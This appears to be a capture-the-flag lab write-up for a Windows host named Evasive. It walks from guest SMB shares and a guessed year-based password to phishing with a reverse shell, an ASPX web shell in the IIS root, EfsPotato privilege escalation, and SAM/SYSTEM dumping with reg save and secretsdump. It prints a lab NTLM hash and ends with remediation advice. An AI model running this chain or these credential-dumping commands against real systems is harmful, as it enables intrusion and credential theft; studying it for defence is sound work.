What you need to know

  • SMB guest shares and file search
  • POP3 and SMTP as an internal mail path
  • IIS app pool identity and SeImpersonate
  • reg save of SAM and SYSTEM, secretsdump, open KeePass

Main idea

Guest docs show the password pattern. Mail lets you phish a user who can write web root. The IIS pool then uses SeImpersonate to become SYSTEM.

Story

Evasive has IIS, hMailServer, SMB, and RDP. Start with guest SMB. Read the PDF docs. Guess the year change on the default password. Log on as roger to mail. Phish alfonso with a reverse shell. Write an ASPX under wwwroot. Run as the app pool. Use EfsPotato. Dump SAM. Answer the lab questions from merger PDF and KeePass.

Why it works

Open shares leak policy text. Users reuse a year based default password. A user can write IIS content. The app pool has SeImpersonate. Mail blocks brute force, so you use the docs, not a spray. 

guest SMB PDFs
  → NewUser2024! style → live NewUser2025!
  → roger mail
  → phish alfonso
  → merger_info.pdf + write wwwroot
  → ASPX as IIS APPPOOL → EfsPotato SYSTEM
  → reg save SAM/SYSTEM → secretsdump
  → RDP alfonso → KeePass → card

Step 1: Map services

Why: Attack surface is mail, web, and SMB, not only RDP.
nmap -Pn -n -sV -sC -p 25,80,110,135,139,143,445,587,3389 10.1.84.198

Expect: hMailServer, IIS 10 on port 80, SMB, RDP. Host winserver01.hs.

Step 2: Guest SMB and PDFs

Why: First user passwords often sit in open HR or IT docs.
nxc smb 10.1.84.198 -u guest -p '' --shares
# pull old_user_setup_doc.pdf and related docs

PDF shows style NewUser2024!. Live password used year 2025:

roger / NewUser2025!

Do not brute mail. Anti brute force will block you. Use the doc pattern and the year change.

Step 3: Roger mail and phish alfonso

Why: Mail proves the password and delivers a payload to a better user.
# POP3/SMTP as roger:NewUser2025!
# send phish with Go reverse shell
# catch shell as alfonso

Step 4: Company answer and web write

Why: Lab asks which company is bought. Same rights can plant IIS files.
# read merger_info.pdf
# company answer: AI is the Future Corp
# write ASPX under IIS wwwroot where write is allowed
Company: AI is the Future Corp

Step 5: IIS pool, EfsPotato, SYSTEM, SAM

Why: Many app pool tokens hold SeImpersonate. Potato tools turn that into SYSTEM.
# trigger ASPX → shell as IIS APPPOOL\...
whoami /priv
# EfsPotato → NT AUTHORITY\SYSTEM
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# copy hives; secretsdump.py -sam sam.save -system system.save LOCAL
Administrator NTLM: 4366ec0f86e29be2a4a5e87a1ba922ec

Step 6: KeePass card

Why: Last lab question. Card sits in an open KeePass on the user session.
# RDP as alfonso
# KeePass is open in the lab state
# read the card
Credit card: 1234-5555-6666-8521

Impact

  • Guest share to SYSTEM on one host
  • Admin NTLM for pass the hash
  • Card data from an open password vault

Fix

  • Turn off guest SMB. Do not put password examples on open shares.
  • Force unique first passwords. Ban year based defaults.
  • Harden mail. Do not let users write IIS roots.
  • Run app pools without SeImpersonate when you can. Isolate sites.
  • Lock KeePass when idle. Do not leave vaults open on shared consoles.
  • Alert on guest reads of IT PDFs, ASPX drops under wwwroot, and reg save of SAM.
